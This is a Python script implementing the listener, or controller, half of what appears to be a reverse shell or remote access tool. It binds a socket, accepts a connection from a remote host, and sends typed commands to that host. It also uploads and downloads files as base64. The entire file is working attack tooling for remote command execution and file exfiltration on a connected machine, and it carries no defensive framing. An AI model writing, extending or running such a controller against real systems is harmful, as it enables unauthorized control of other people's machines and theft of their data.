#!/usr/bin/env python
import socket, errno
import base64
import json
import sys
from util import parse_args


class ListenerException(Exception):
    pass


class Listener:

    """
    TODO:
        Listener class should check for an existing connection and reconnect  (to handle connection interruptions)

    """
    def __init__(self, ip, port):

        if not ip or ip is None:
            raise ListenerException
        else:
            self.ip = ip

        if not port or port is None:
            raise ListenerException
        else:
            self.port = port

        self.buffer_size = 1024
        self.connection = None
        self.address = None
        self.connect()

    def connect(self):

        try:
            self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except ConnectionError:
            print('[*] Connection error. Retrying.\n')
            try:
                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            except ConnectionError as error:
                raise error
        else:
            self.connection.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.connection.bind((self.ip, self.port))
            self.connection.listen(0)
            print('[-] Awaiting connection')
            self.connection, self.address = self.connection.accept()
            print(f'[+] Got a connection from {str(self.address)}')

    def transmit(self, data):
        transmission = json.dumps(data).encode()
        return self.connection.send(transmission)

    def receive(self):
        transmission = ''
        while True:
            try:
                transmission = self.connection.recv(self.buffer_size)
                return json.loads(transmission)
            except ValueError:
                continue

    def execute_command(self, command):
        self.transmit(command)

        if command[0] == 'exit':
            self.connection.close()
            sys.exit()

        return self.receive()

    @staticmethod
    def read_file(path):
        with open(path, 'rb') as f:
            return base64.b64encode(f.read())

    @staticmethod
    def write_file(path, contents):
        with open(path, 'wb') as f:
            f.write(base64.b64decode(contents))
            return f'[+] Success - downloaded {str(path)}'

    def run(self):
        while True:
            command = str(input('>> '))
            command = command.split(' ')
            try:
                if command[0] == 'upload':
                    content = self.read_file(command[1])
                    command.append(content)
                result = self.execute_command(command)
                if command[0] == 'download' and 'error' not in result.lower():
                    print(f'[debug] {command[0] } {command[1] }')
                    print(f'[debug] error present: {"error" not in result.lower()}')
                    result = self.write_file(command[1], result)
            except ListenerException as err:
                result = err

            print(result)


if __name__ == '__main__':
    args = parse_args()
    try:
        listener = Listener(args.ip, args.port)
        listener.run()
    except (ListenerException, KeyboardInterrupt):
        sys.exit()
